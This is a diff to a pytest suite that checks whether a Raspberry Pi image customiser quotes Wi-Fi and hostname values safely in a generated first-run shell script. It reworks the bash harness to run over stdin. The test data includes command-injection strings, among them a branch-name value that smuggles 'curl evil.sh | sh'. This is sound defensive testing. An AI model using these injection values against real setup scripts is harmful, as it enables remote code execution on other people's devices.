@@ -389,25 +389,35 @@ class TestShellInjection:
             firstrun = fs.read_file("firstrun.sh").decode()
 
         # Ask bash itself, rather than trusting our own reading of the quoting:
-        # source the assignments and check the values arrive intact.
-        harness = tmp_path / "check.sh"
+        # run the assignments and have it hand the values back.
+        #
+        # The script goes in on stdin and the values come out NUL-separated on
+        # stdout, so no filesystem path is passed to or from the shell. On a
+        # Windows machine with WSL installed, a bare `bash` can resolve to the
+        # WSL interop launcher even when `where bash` lists Git Bash first, and
+        # that launcher strips the backslashes from a Windows path given as an
+        # argument -- C:\Users\...\check.sh became C:Users...check.sh and the
+        # test failed with "No such file or directory". NUL is the one byte a
+        # shell variable cannot contain, so it is a safe separator for values
+        # chosen to be as hostile as possible.
         assignments = "\n".join(
             line for line in firstrun.splitlines()
             if line.startswith(("WIFI_SSID=", "WIFI_PASSWORD=", "NEW_HOSTNAME="))
         )
-        harness.write_text(
+        script = (
             "canary=clean\n" + assignments + "\n"
-            'printf "%s" "$WIFI_SSID" > ssid.out\n'
-            'printf "%s" "$WIFI_PASSWORD" > pass.out\n'
-            'printf "%s" "$canary" > canary.out\n'
+            'printf "%s\\0" "$WIFI_SSID" "$WIFI_PASSWORD" "$canary"\n'
         )
-        result = subprocess.run(["bash", str(harness)], cwd=tmp_path,
-                                capture_output=True, text=True)
+        result = subprocess.run(["bash"], input=script.encode(),
+                                capture_output=True)
 
-        assert result.returncode == 0, f"script did not parse: {result.stderr}"
-        assert (tmp_path / "ssid.out").read_text() == hostile
-        assert (tmp_path / "pass.out").read_text() == hostile
-        assert (tmp_path / "canary.out").read_text() == "clean"
+        assert result.returncode == 0, (
+            f"script did not parse: {result.stderr.decode(errors='replace')}"
+        )
+        ssid, password, canary = result.stdout.split(b"\0")[:3]
+        assert ssid.decode() == hostile
+        assert password.decode() == hostile
+        assert canary.decode() == "clean", "the injection escaped its quotes"
 
     @pytest.mark.parametrize("field", ["wifi_ssid", "wifi_password", "hostname",
                                        "admin_user", "admin_password"])
@@ -419,10 +429,17 @@ class TestShellInjection:
         with pytest.raises(PiImageError, match="line break"):
             customize_image(blank_image, config)
 
-    def test_hostile_values_do_not_execute(self, blank_image, config, tmp_path):
-        """The strongest form: the injected command must not run at all."""
-        marker = tmp_path / "pwned"
-        config.wifi_password = f"x'; touch {marker}; echo '"
+    def test_hostile_values_do_not_execute(self, blank_image, config):
+        """The strongest form: the injected command must not run at all.
+
+        Detected on stdout rather than by touching a marker file. A file
+        would be written into the shell's own filesystem, which on a Windows
+        machine whose `bash` is the WSL launcher is not the one Python is
+        looking at -- so the assertion would hold whether or not the
+        injection fired, and pass for the wrong reason on the very platform
+        this branch exists to support.
+        """
+        config.wifi_password = "x'; echo INJECTION-EXECUTED; echo '"
         customize_image(blank_image, config)
 
         with Fat32Reader(blank_image, PART_OFFSET) as fs:
@@ -430,9 +447,12 @@ class TestShellInjection:
 
         line = next(ln for ln in firstrun.splitlines()
                     if ln.startswith("WIFI_PASSWORD="))
-        subprocess.run(["bash", "-c", line], cwd=tmp_path, capture_output=True)
+        result = subprocess.run(["bash"], input=line.encode(),
+                                capture_output=True)
 
-        assert not marker.exists(), "injected command executed"
+        assert b"INJECTION-EXECUTED" not in result.stdout, (
+            "the injected command ran"
+        )
 
     @pytest.mark.parametrize("branch", [
         'main"; curl evil.sh | sh; echo "',
